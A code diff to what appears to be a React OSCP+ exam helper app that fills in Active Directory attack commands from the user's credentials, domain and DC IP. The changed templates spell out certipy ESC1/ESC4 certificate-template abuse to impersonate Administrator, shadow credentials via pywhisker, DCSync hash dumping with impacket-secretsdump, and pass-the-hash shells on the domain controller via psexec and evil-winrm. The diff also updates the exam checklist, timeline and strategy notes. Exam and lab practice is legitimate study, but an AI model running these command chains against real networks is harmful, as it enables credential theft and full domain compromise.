-      { action: "ESC4 — Template ACL abuse", cmd: (u,p,d,dc) => `# If you have write access to a template:\ncertipy template -u '${u||"user"}@${d||"domain.local"}' -p '${p||"password"}' -dc-ip ${dc||"DC_IP"} -template 'VULN-TEMPLATE' -save-old\n\n# Then request like ESC1:\ncertipy req -u '${u||"user"}@${d||"domain.local"}' -p '${p||"password"}' -dc-ip ${dc||"DC_IP"} -ca 'CA-NAME' -template 'VULN-TEMPLATE' -upn 'Administrator@${d||"domain.local"}'`, check: "Modify template → ESC1 attack" },
-      { action: "Shadow Credentials", cmd: (u,p,d,dc) => `# If you have GenericWrite on a computer/user:\ncertipy shadow auto -u '${u||"user"}@${d||"domain.local"}' -p '${p||"password"}' -account 'TARGET$' -dc-ip ${dc||"DC_IP"}\n\n# Or with pywhisker:\npython3 pywhisker.py -d '${d||"domain.local"}' -u '${u||"user"}' -p '${p||"password"}' --target 'TARGET$' --action add --dc-ip ${dc||"DC_IP"}`, check: "GenericWrite → Shadow Credentials → auth" },
+      { action: "Find ADCS + vulnerable templates", cmd: (t,u,p,d,dc) => `# Certipy — find all vulnerable templates:\ncertipy find -u '${u||"user"}@${d||"domain.local"}' -p '${p||"password"}' -dc-ip ${dc||t||"DC_IP"} -vulnerable -stdout\n\n# Or from Windows:\n.\\Certify.exe find /vulnerable`, check: "ESC1-ESC8 vulnerable templates?", critical: true },
+      { action: "ESC1 — Template abuse", cmd: (t,u,p,d,dc) => `# Request cert with SAN of DA:\ncertipy req -u '${u||"user"}@${d||"domain.local"}' -p '${p||"password"}' -dc-ip ${dc||t||"DC_IP"} -ca 'CA-NAME' -template 'VULN-TEMPLATE' -upn 'Administrator@${d||"domain.local"}'\n\n# Auth with the cert:\ncertipy auth -pfx administrator.pfx -dc-ip ${dc||t||"DC_IP"}`, check: "Get DA cert → auth as DA!", critical: true },
+      { action: "ESC4 — Template ACL abuse", cmd: (t,u,p,d,dc) => `# If you have write access to a template:\ncertipy template -u '${u||"user"}@${d||"domain.local"}' -p '${p||"password"}' -dc-ip ${dc||t||"DC_IP"} -template 'VULN-TEMPLATE' -save-old\n\n# Then request like ESC1:\ncertipy req -u '${u||"user"}@${d||"domain.local"}' -p '${p||"password"}' -dc-ip ${dc||t||"DC_IP"} -ca 'CA-NAME' -template 'VULN-TEMPLATE' -upn 'Administrator@${d||"domain.local"}'`, check: "Modify template → ESC1 attack" },
+      { action: "Shadow Credentials", cmd: (t,u,p,d,dc) => `# If you have GenericWrite on a computer/user:\ncertipy shadow auto -u '${u||"user"}@${d||"domain.local"}' -p '${p||"password"}' -account 'TARGET$' -dc-ip ${dc||t||"DC_IP"}\n\n# Or with pywhisker:\npython3 pywhisker.py -d '${d||"domain.local"}' -u '${u||"user"}' -p '${p||"password"}' --target 'TARGET$' --action add --dc-ip ${dc||t||"DC_IP"}`, check: "GenericWrite → Shadow Credentials → auth" },
     ]
   },
   {
-    phase: "6. Domain Compromise",
+    phase: "7. Domain Compromise",
     desc: "Final step: Domain Admin or equivalent access to the DC.",
+    requiresCreds: true,
+    color: "#f97316",
     steps: [
-      { action: "DCSync attack", cmd: (u,p,d,dc) => `# If you have replication rights (or are DA):\nimpacket-secretsdump '${d||"domain.local"}/${u||"admin"}:${p||"password"}'@${dc||"DC_IP"} -just-dc\n\n# Dump only specific user:\nimpacket-secretsdump '${d||"domain.local"}/${u||"admin"}:${p||"password"}'@${dc||"DC_IP"} -just-dc-user Administrator`, check: "Full domain hash dump = game over", critical: true },
-      { action: "Access DC", cmd: (u,p,d,dc) => `# Shell on DC:\nimpacket-psexec '${d||"domain.local"}/Administrator:password'@${dc||"DC_IP"}\nimpacket-psexec -hashes :NTLM_HASH '${d||"domain.local"}/Administrator'@${dc||"DC_IP"}\nevil-winrm -i ${dc||"DC_IP"} -u Administrator -H NTLM_HASH`, check: "Get shell, grab proof.txt" },
-      { action: "Grab flags", cmd: () => `# On each compromised machine:\ntype C:\\Users\\Administrator\\Desktop\\proof.txt\ntype C:\\Users\\*\\Desktop\\local.txt\n\n# SCREENSHOT EVERYTHING!\n# Include: whoami, ipconfig, type proof.txt`, check: "SCREENSHOT with whoami + hostname + flag", critical: true },
+      { action: "DCSync attack", cmd: (t,u,p,d,dc) => `# If you have replication rights (or are DA):\nimpacket-secretsdump '${d||"domain.local"}/${u||"admin"}:${p||"password"}'@${dc||t||"DC_IP"} -just-dc\n\n# Dump only Administrator:\nimpacket-secretsdump '${d||"domain.local"}/${u||"admin"}:${p||"password"}'@${dc||t||"DC_IP"} -just-dc-user Administrator`, check: "Full domain hash dump = game over", critical: true },
+      { action: "Access DC", cmd: (t,u,p,d,dc) => `# Shell on DC with creds:\nimpacket-psexec '${d||"domain.local"}/Administrator:${p||"password"}'@${dc||t||"DC_IP"}\n\n# Shell on DC with hash:\nimpacket-psexec -hashes :NTLM_HASH '${d||"domain.local"}/Administrator'@${dc||t||"DC_IP"}\nevil-winrm -i ${dc||t||"DC_IP"} -u Administrator -H NTLM_HASH`, check: "Get shell, grab proof.txt" },
+      { action: "Grab flags on ALL machines", cmd: () => `# On EACH compromised machine:\ntype C:\\Users\\Administrator\\Desktop\\proof.txt\ntype C:\\Users\\*\\Desktop\\local.txt\nhostname\nipconfig\nwhoami\n\n# SCREENSHOT EVERYTHING!\n# Each screenshot must show: whoami + hostname + flag value\n# Take one screenshot per machine!`, check: "SCREENSHOT with whoami + hostname + flag", critical: true },
     ]
   },
 ];
@@ -379,8 +426,13 @@ const HASH_PATTERNS = [
 
 // ─── CHECKLIST (OSCP+ 2026 format) ───
 const CHECKLIST = {
-  "AD Set (40 pts) — Assumed Breach": [
-    "Domain user creds confirmed working",
+  "AD Set (40 pts)": [
+    "Full port scan (-p-) on all AD machines",
+    "Domain Controller identified (ports 53, 88, 389)",
+    "Anonymous LDAP / SMB / RPC enumeration done",
+    "Kerberos user enumeration (kerbrute)",
+    "SNMP checked for user/process leaks",
+    "Initial domain creds obtained",
     "Domain enumeration (users, groups, computers)",
     "BloodHound collection + analysis",
     "SYSVOL/NETLOGON searched for creds",
@@ -389,7 +441,7 @@ const CHECKLIST = {
     "Password spraying with found patterns",
     "ACL abuse paths checked (BloodHound)",
     "Lateral movement to member servers",
-    "Local SAM dumped on each compromised host",
+    "Local SAM/LSASS dumped on each compromised host",
     "Domain escalation path identified",
     "DCSync or Domain Admin achieved",
     "DC accessed — proof.txt captured",
@@ -439,10 +491,10 @@ const CHECKLIST = {
 
 // ─── EXAM TIMER MILESTONES ───
 const MILESTONES = [
-  { hour: 0, label: "START — Nmap all machines. Begin AD enum." },
-  { hour: 1, label: "AD enum should be running. BloodHound data collected." },
-  { hour: 3, label: "AD: First lateral movement or credential harvest." },
-  { hour: 5, label: "AD: Should have escalated or pivoted. Start standalones if stuck." },
+  { hour: 0, label: "START — Nmap -p- ALL machines. Begin AD unauthenticated enum." },
+  { hour: 1, label: "AD recon done (LDAP, SMB, SNMP, kerbrute). Start foothold attempts." },
+  { hour: 3, label: "Should have domain creds. Run BloodHound. Kerberoast." },
+  { hour: 5, label: "AD: lateral movement or escalation. Start standalones if stuck." },
   { hour: 8, label: "TARGET: 50+ pts locked in (AD + 1 standalone)." },
   { hour: 12, label: "HALFWAY — You should have 50-70 pts. Reassess strategy." },
   { hour: 16, label: "Focus on easy wins. Document everything." },
@@ -599,9 +651,10 @@ function identifyHash(h){
   return matches;
 }
 
-// ━━━ TAB: AD ATTACK CHAIN ━━━
-function ADTab({lhost,dUser,setDUser,dPass,setDPass,domain,setDomain,dcIP,setDCIP,foundCreds,setFoundCreds}){
-  const[openPhase,setOpenPhase]=useState({0:true});
+// ━━━ TAB: AD ATTACK ━━━
+function ADTab({targetIP,lhost,dUser,setDUser,dPass,setDPass,domain,setDomain,dcIP,setDCIP,foundCreds,setFoundCreds}){
+  const hasCreds=!!(dUser&&dPass);
+  const[openPhase,setOpenPhase]=useState(()=>hasCreds?{2:true}:{0:true});
   const[openSteps,setOpenSteps]=useState({});const[doneSteps,setDoneSteps]=usePersistedState('ad-done',{});
   const[newCred,setNewCred]=useState({user:'',pass:'',source:''});
   const addCred=()=>{if(newCred.user||newCred.pass){setFoundCreds(p=>[...p,{...newCred,id:Date.now()}]);setNewCred({user:'',pass:'',source:''})}};
@@ -611,8 +664,14 @@ function ADTab({lhost,dUser,setDUser,dPass,setDPass,domain,setDomain,dcIP,setDCI
 
   return(<div>
     <div className="score-bar">
-      <div className="score-seg" style={{background:'var(--acd)',color:'var(--ac)',flex:2}}>AD Set = 10 + 10 + 20 = 40 pts (assumed breach)</div>
+      <div className="score-seg" style={{background:'var(--acd)',color:'var(--ac)',flex:2}}>AD Set = 10 + 10 + 20 = 40 pts</div>
       <div className="score-seg" style={{background:'var(--gd)',color:'var(--g)'}}>Need 70 to pass</div>
+    </div>
+    <div style={{background:hasCreds?'rgba(34,197,94,0.08)':'rgba(59,130,246,0.08)',border:`1px solid ${hasCreds?'var(--g)':'#3b82f6'}`,borderRadius:6,padding:'8px 14px',marginBottom:14,display:'flex',alignItems:'center',gap:8}}>
+      <span style={{fontSize:16}}>{hasCreds?'🔓':'🔒'}</span>
+      <div style={{fontSize:11,color:hasCreds?'var(--g)':'#3b82f6',fontWeight:600}}>
+        {hasCreds?`Creds loaded: ${dUser}@${domain||'domain'} — Start at Phase 2 (Situational Awareness)`:'No domain creds yet — Start at Phase 0 (External Recon)'}
+      </div>
     </div>
     <div className="ad-inputs">
       <input className="inp" style={{width:120}} placeholder="Domain User" value={dUser} onChange={e=>setDUser(e.target.value)}/>
@@ -630,19 +689,23 @@ function ADTab({lhost,dUser,setDUser,dPass,setDPass,domain,setDomain,dcIP,setDCI
       <input className="inp" style={{flex:1}} placeholder="Source (e.g. Kerberoast)" value={newCred.source} onChange={e=>setNewCred(p=>({...p,source:e.target.value}))}/>
       <button className="cp" style={{padding:'6px 12px',background:'var(--acd)',borderColor:'var(--ac)',color:'var(--ac)'}} onClick={addCred}>+ Add Cred</button>
     </div>
-    {AD_CHAIN.map((phase,pi)=>{
+    {AD_PHASES.map((phase,pi)=>{
       const isOpen=openPhase[pi]!==false;
       const phaseDone=phase.steps.every((_,si)=>doneSteps[`ad-${pi}-${si}`]);
-      return(<div className="phase" key={pi}>
+      const phaseColor=phase.color||'var(--ac)';
+      return(<div className="phase" key={pi} style={{borderColor:phaseDone?'var(--g)':phaseColor+'33'}}>
         <div className="phase-h" onClick={()=>tP(pi)}>
-          <div className={`phase-num ${phaseDone?'done':''}`}>{phaseDone?'✓':pi+1}</div>
-          <div style={{flex:1}}><div className="phase-title">{phase.phase}</div><div className="phase-desc">{phase.desc}</div></div>
+          <div className={`phase-num ${phaseDone?'done':''}`} style={phaseDone?{}:{background:phaseColor+'18',borderColor:phaseColor,color:phaseColor}}>{phaseDone?'✓':pi}</div>
+          <div style={{flex:1}}>
+            <div className="phase-title">{phase.phase}{!phase.requiresCreds&&<span style={{fontSize:9,marginLeft:8,padding:'1px 6px',borderRadius:4,background:'rgba(59,130,246,0.1)',color:'#3b82f6',fontWeight:600}}>NO CREDS</span>}</div>
+            <div className="phase-desc">{phase.desc}</div>
+          </div>
           <span className={`arrow ${isOpen?'open':''}`}>▶</span>
         </div>
         {isOpen&&<div className="steps-wrap">
           {phase.steps.map((step,si)=>{
             const k=`ad-${pi}-${si}`;const isExp=openSteps[k];const isDone=doneSteps[k];
-            const cmdText=step.cmd(dUser,dPass,domain,dcIP);
+            const cmdText=step.cmd(targetIP||'',dUser,dPass,domain,dcIP);
             return(<div className="step" key={si}>
               <div className="step-row" onClick={()=>tS(k)}>
                 <div className={`snum ${isDone?'done':step.critical?'crit':''}`} onClick={e=>tD(k,e)}>{isDone?'✓':si+1}</div>
@@ -1078,15 +1141,16 @@ function TimerTab(){
     <div className="gen-out"><div className="cmd" style={{color:'var(--y)'}}>{`# OSCP+ 2026 Optimal Strategy:
 #
 # 1. START: Launch nmap -p- on ALL machines simultaneously
-# 2. While scans run: Begin AD enumeration (you have creds)
-# 3. Hours 1-5: Focus on AD set (40 pts)
-#    - BloodHound → Kerberoast → ACL abuse → DA
-# 4. Hours 5-8: First standalone (easiest looking)
+# 2. While scans run: Begin AD unauthenticated enum
+#    - Anonymous LDAP, SMB null sessions, SNMP, kerbrute
+# 3. Hours 1-3: Get initial domain creds (AS-REP, spray, web exploit)
+# 4. Hours 3-6: AD with creds — BloodHound → Kerberoast → ACL → DA
+# 5. Hours 6-8: First standalone (easiest looking)
 #    - Quick wins: default creds, known CVEs
-# 5. Hour 8: You should have 50-60 pts
-# 6. Hours 8-16: Remaining standalones
-# 7. Hour 16-20: Mop up, try stuck machines
-# 8. Hour 20+: STOP. Write report.
+# 6. Hour 8: You should have 50-60 pts
+# 7. Hours 8-16: Remaining standalones
+# 8. Hour 16-20: Mop up, try stuck machines
+# 9. Hour 20+: STOP. Write report.
 #
 # CRITICAL RULES:
 # - NEVER spend >2 hours on one vector. Move on.
@@ -1661,7 +1725,7 @@ function App(){
       <div className="tabs">{TABS.map(t=><button key={t.id} className={`tab ${tab===t.id?'on':''}`} onClick={()=>setTab(t.id)}>{t.icon} {t.label}</button>)}</div>
       <div className="main">
         {tab==="recon"&&<ReconTab targetIP={targetIP}/>}
-        {tab==="ad"&&<ADTab lhost={lhost} dUser={dUser} setDUser={setDUser} dPass={dPass} setDPass={setDPass} domain={domain} setDomain={setDomain} dcIP={dcIP} setDCIP={setDCIP} foundCreds={foundCreds} setFoundCreds={setFoundCreds}/>}
+        {tab==="ad"&&<ADTab targetIP={targetIP} lhost={lhost} dUser={dUser} setDUser={setDUser} dPass={dPass} setDPass={setDPass} domain={domain} setDomain={setDomain} dcIP={dcIP} setDCIP={setDCIP} foundCreds={foundCreds} setFoundCreds={setFoundCreds}/>}
         {tab==="auto"&&<AutopilotTab targetIP={targetIP} foundCreds={foundCreds} setFoundCreds={setFoundCreds}/>}
         {tab==="privesc"&&<PrivEscTab lhost={lhost}/>}
         {tab==="tunnel"&&<TunnelingTab lhost={lhost}/>}
